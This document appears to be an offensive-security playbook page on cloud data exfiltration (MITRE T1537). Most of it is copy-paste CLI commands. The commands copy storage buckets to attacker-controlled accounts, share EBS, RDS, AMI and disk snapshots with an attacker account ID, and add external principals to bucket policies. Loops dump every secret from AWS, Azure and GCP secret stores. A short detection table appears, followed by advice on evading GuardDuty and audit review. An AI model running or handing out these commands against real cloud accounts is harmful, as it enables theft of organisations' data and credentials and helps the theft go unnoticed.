# Cloud Data Exfiltration

> **MITRE ATT&CK**: Exfiltration > T1537 - Transfer Data to Cloud Account
> **Platforms**: AWS, Azure, GCP
> **Required Privileges**: Varies (storage read + cross-account write)
> **OPSEC Risk**: Medium (cloud API calls are logged; cross-account transfers are anomalous)

## Strategic Overview

Cloud exfiltration exploits the fundamental nature of cloud infrastructure: data is accessed via APIs, and those APIs often allow copying data to external accounts with the right permissions. Unlike on-premises exfiltration where data must traverse network boundaries through monitored chokepoints, cloud exfiltration can happen entirely within the cloud provider's network -- a copy from one S3 bucket to another never touches a corporate firewall. This makes cloud exfiltration simultaneously easier to execute and harder to detect with traditional network-based controls. The key detection mechanism is audit logging (CloudTrail, Azure Activity Log, GCP Audit Logs), which most organizations have enabled but few actively monitor for cross-account data movement.

**Attack philosophy**: The most effective cloud exfiltration leverages the target's own IAM permissions and cloud-native data transfer mechanisms rather than downloading and re-uploading data.

## Technical Deep-Dive

### AWS S3 Exfiltration

```bash
# Direct copy to attacker-controlled bucket
aws s3 cp s3://target-bucket/sensitive-data/ s3://attacker-bucket/exfil/ --recursive
aws s3 sync s3://target-bucket/ s3://attacker-bucket/exfil/

# Copy to local and then to attacker bucket (if cross-account copy is blocked)
aws s3 cp s3://target-bucket/data.db /tmp/data.db
aws s3 cp /tmp/data.db s3://attacker-bucket/exfil/ --profile attacker

# Modify bucket policy to allow attacker access (if IAM permits)
# Add attacker's AWS account to the bucket policy
aws s3api put-bucket-policy --bucket target-bucket --policy '{
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT_ID:root"},
    "Action": ["s3:GetObject", "s3:ListBucket"],
    "Resource": ["arn:aws:s3:::target-bucket", "arn:aws:s3:::target-bucket/*"]
  }]
}'

# Make bucket or objects temporarily public (extremely noisy but fast)
aws s3api put-object-acl --bucket target-bucket --key sensitive.db --acl public-read
# Download from anywhere: curl https://target-bucket.s3.amazonaws.com/sensitive.db
```

### AWS EBS Snapshot Sharing

```bash
# Share EBS snapshot with attacker's AWS account
# List snapshots
aws ec2 describe-snapshots --owner-ids self --query 'Snapshots[].{ID:SnapshotId,Vol:VolumeId,Size:VolumeSize}'

# Create snapshot of target volume (if needed)
aws ec2 create-snapshot --volume-id vol-0123456789abcdef --description "backup"

# Share snapshot with attacker account
aws ec2 modify-snapshot-attribute --snapshot-id snap-0123456789abcdef --attribute createVolumePermission --operation-type add --user-ids ATTACKER_ACCOUNT_ID

# Attacker then creates volume from shared snapshot in their account
aws ec2 create-volume --snapshot-id snap-0123456789abcdef --availability-zone us-east-1a --profile attacker
# Mount and browse the entire disk image
```

### AWS RDS Snapshot Sharing

```bash
# Share RDS database snapshot with attacker account
aws rds describe-db-snapshots --query 'DBSnapshots[].{ID:DBSnapshotIdentifier,DB:DBInstanceIdentifier}'

# Create snapshot
aws rds create-db-snapshot --db-instance-identifier target-db --db-snapshot-identifier exfil-snap

# Share with attacker account
aws rds modify-db-snapshot-attribute --db-snapshot-identifier exfil-snap --attribute-name restore --values-to-add ATTACKER_ACCOUNT_ID

# Attacker restores the snapshot in their account
aws rds restore-db-instance-from-db-snapshot --db-instance-identifier stolen-db --db-snapshot-identifier exfil-snap --profile attacker
```

### AWS AMI Sharing

```bash
# Share AMI with attacker account, then launch instance in attacker's environment
aws ec2 modify-image-attribute --image-id ami-0123456789abcdef --launch-permission "Add=[{UserId=ATTACKER_ACCOUNT_ID}]"
```

### Azure Blob Exfiltration

```bash
# Generate SAS token for attacker access (if storage account admin)
az storage container generate-sas --account-name targetaccount --name sensitive-container \
  --permissions rl --expiry 2024-12-31 --output tsv

# Copy blob to attacker storage using AzCopy
azcopy copy "https://targetaccount.blob.core.windows.net/data/*?SAS_TOKEN" \
  "https://attackeraccount.blob.core.windows.net/exfil/?ATTACKER_SAS"

# Create new SAS token with broader permissions
az storage account generate-sas --account-name targetaccount --permissions rl \
  --resource-types sco --services b --expiry 2024-12-31 --output tsv

# Download via Azure Storage Explorer (GUI, legitimate admin tool)
```

### Azure Key Vault / Disk Snapshot Exfiltration

```bash
# Key Vault -- dump all secrets
for secret in $(az keyvault secret list --vault-name TARGET_VAULT --query "[].name" -o tsv); do
    echo "$secret: $(az keyvault secret show --vault-name TARGET_VAULT --name $secret --query value -o tsv)"
done

# Disk snapshot -- create, grant SAS access, download VHD
az snapshot create --resource-group TARGET_RG --source TARGET_DISK_ID --name exfil-snap
az snapshot grant-access --resource-group TARGET_RG --name exfil-snap --duration-in-seconds 3600 --access-level Read
```

### GCP Exfiltration

```bash
# Copy Cloud Storage objects to attacker bucket
gsutil cp -r gs://target-bucket/ gs://attacker-bucket/exfil/

# Make bucket temporarily public
gsutil iam ch allUsers:objectViewer gs://target-bucket/
# Revert: gsutil iam ch -d allUsers:objectViewer gs://target-bucket/

# Share Compute Engine disk snapshot
gcloud compute snapshots create exfil-snap --source-disk=target-disk --source-disk-zone=us-central1-a
gcloud compute snapshots add-iam-policy-binding exfil-snap \
  --member='user:attacker@gmail.com' --role='roles/compute.storageAdmin'

# Export Cloud SQL database
gcloud sql export sql TARGET_INSTANCE gs://target-bucket/dump.sql --database=production
gsutil cp gs://target-bucket/dump.sql gs://attacker-bucket/
```

### Secrets Manager / Parameter Store

```bash
# AWS Secrets Manager -- dump all secrets
for secret in $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text); do
    echo "$secret: $(aws secretsmanager get-secret-value --secret-id $secret --query SecretString --output text)"
done

# AWS SSM Parameter Store
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption --query 'Parameters[].{Name:Name,Value:Value}'

# GCP Secret Manager
for secret in $(gcloud secrets list --format="value(name)"); do
    echo "$secret: $(gcloud secrets versions access latest --secret=$secret)"
done
```

## Detection & Evasion

| Activity | Detection Source | Alert Indicators |
|----------|-----------------|-----------------|
| S3 cross-account copy | CloudTrail | s3:GetObject from foreign AssumedRole/account |
| Snapshot sharing | CloudTrail | ModifySnapshotAttribute, ModifyDBSnapshotAttribute |
| Bucket policy modification | CloudTrail, AWS Config | PutBucketPolicy with external principal |
| SAS token generation | Azure Activity Log | GenerateAccountSasToken from unusual IP |
| Public bucket/object creation | GuardDuty, AWS Config | Policy:S3/BucketAnonymousAccessGranted |
| Key Vault access | Azure Diagnostic Logs | SecretGet in bulk from unusual IP |

**Evasion strategies**: Use existing cross-account roles (appears legitimate), generate short-lived SAS tokens/pre-signed URLs instead of permanent policy changes, time exfiltration with backup windows, never make resources public (triggers GuardDuty/Defender), clean up all sharing/tokens after exfiltration, and use VPC endpoints to avoid public internet traversal.

## Cross-References

- [Data Staging](./data-staging.md)
- [Exfiltration Channels](./exfiltration-channels.md)
- [Cloud Discovery](../08-discovery/cloud-discovery.md)
- [Cloud Privilege Escalation](../05-privilege-escalation/)

## References

- MITRE ATT&CK T1537: https://attack.mitre.org/techniques/T1537/
- AWS Exfiltration Techniques: https://hackingthe.cloud/aws/exploitation/s3-bucket-exfiltration/
- Rhino Security Labs - AWS Data Exfiltration: https://rhinosecuritylabs.com/aws/
- Microsoft Cloud Adoption Framework - Security: https://learn.microsoft.com/en-us/azure/cloud-adoption-framework/secure/
- MITRE T1530 (Data from Cloud Storage): https://attack.mitre.org/techniques/T1530/
